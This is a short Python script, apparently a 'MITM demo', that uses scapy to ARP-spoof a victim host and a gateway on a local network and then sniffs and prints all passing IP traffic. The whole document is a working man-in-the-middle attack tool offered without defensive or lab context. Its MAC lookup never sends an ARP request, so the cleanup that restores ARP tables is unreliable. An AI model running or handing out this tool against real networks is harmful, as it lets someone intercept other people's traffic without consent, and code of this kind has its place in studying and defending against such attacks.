# ⚠️ Requires: pip install scapy
# ⚠️ Run as root!

from scapy.all import ARP, send, sniff, conf
import time
import sys
import os
from threading import Thread

# CONFIG
target_ip = "192.168.1.10"   # Victim
gateway_ip = "192.168.1.1"   # Router
iface = conf.iface

# Utils
def get_mac(ip):
    ans, _ = ARP(pdst=ip), None
    resp = sniff(filter=f"arp and host {ip}", timeout=2, count=1)
    for p in resp:
        if p.haslayer(ARP):
            return p[ARP].hwsrc
    return None

def spoof(target, spoof_ip):
    packet = ARP(op=2, pdst=target, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(target, target_mac, source_ip, source_mac):
    packet = ARP(op=2, pdst=target, hwdst=target_mac,
                 psrc=source_ip, hwsrc=source_mac)
    send(packet, count=5, verbose=False)

# MITM logic
def mitm():
    try:
        print(f"[*] Starting ARP spoof between {target_ip} and {gateway_ip}")
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Stopping MITM attack...")
        restore(target_ip, get_mac(target_ip), gateway_ip, get_mac(gateway_ip))
        restore(gateway_ip, get_mac(gateway_ip), target_ip, get_mac(target_ip))
        print("[+] ARP tables restored.")

# Passive Sniffing
def sniff_packets():
    print("[*] Starting packet sniffer...\n")
    sniff(filter="ip", prn=lambda pkt: print(pkt.summary()), store=False)

if __name__ == "__main__":
    print("[*] Launching MITM demo...")

    # Start ARP spoof in background
    t1 = Thread(target=mitm)
    t1.start()

    # Start sniffing
    sniff_packets()